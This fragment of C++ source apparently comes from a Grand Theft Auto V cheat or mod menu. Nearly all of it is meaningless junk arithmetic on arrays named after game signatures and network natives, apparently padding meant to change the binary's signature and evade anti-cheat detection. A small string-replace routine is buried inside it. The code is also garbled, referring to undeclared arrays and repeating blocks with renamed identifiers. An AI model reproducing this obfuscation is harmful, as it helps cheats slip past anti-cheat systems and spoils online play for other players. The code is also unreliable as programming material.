			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			size_t start_pos = 0;
			while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
				str.replace(start_pos, from.length(), to);
				start_pos += to.length();
			}
			return str;
		}
		std::string RemoveSpaces(std::string str, const std::string& from = " ", const std::string& to = "") {
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
